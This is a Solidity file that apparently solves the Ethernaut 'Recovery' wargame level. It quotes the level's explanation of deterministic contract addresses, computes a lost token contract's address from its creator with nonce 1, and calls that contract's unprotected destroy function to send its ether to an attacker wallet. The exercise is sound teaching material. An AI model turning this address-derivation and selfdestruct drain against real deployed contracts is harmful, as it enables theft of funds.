// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/Recovery.sol";
// checked in on etherscan lol
// await getBalance('0x1EB2ED5d49696A7e05B5d53Dba4a40904b7bFbBc');
// 0x1EB2ED5d49696A7e05B5d53Dba4a40904b7bFbBc

//ethernaut explanation:
/*
Contract addresses are deterministic and are calculated by keccak256(address, nonce)
 where the address is the address of the contract (or ethereum address that created the transaction) 
 and nonce is the number of contracts the spawning contract has created (or the transaction nonce, 
 for regular transactions).

Because of this, one can send ether to a pre-determined address (which has no private key) 
and later create a contract at that address which recovers the ether. 
This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

An interesting blog post by Martin Swende details potential use cases of this.

If you're going to implement this technique, make sure you don't miss the nonce, 
or your funds will be lost forever.


*/

contract RecoveryAttack{
    SimpleToken public target;
    constructor(SimpleToken _target){
        target = _target;

    }

    function attack(address attacker) public {

        target.destroy(payable(attacker));
    }
}

//instance: 0xcDA25FAEa0BFACb0b7afb6276189cf13D26d46f6
contract RecoveryCoder {

    function recover(address sender) external pure returns (address lostAddress){
        //address nonce0 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94),sender,bytes1(0x80))))));
        // assume nonce1
         lostAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94), sender,bytes1(0x01))))));
    }

    function checkAddressBalance(address add) external view returns (uint256 bal){
        bal = add.balance;
    }

    function attack(SimpleToken target, address attackerWallet) public {
        target.destroy(payable(attackerWallet));

    }
    
}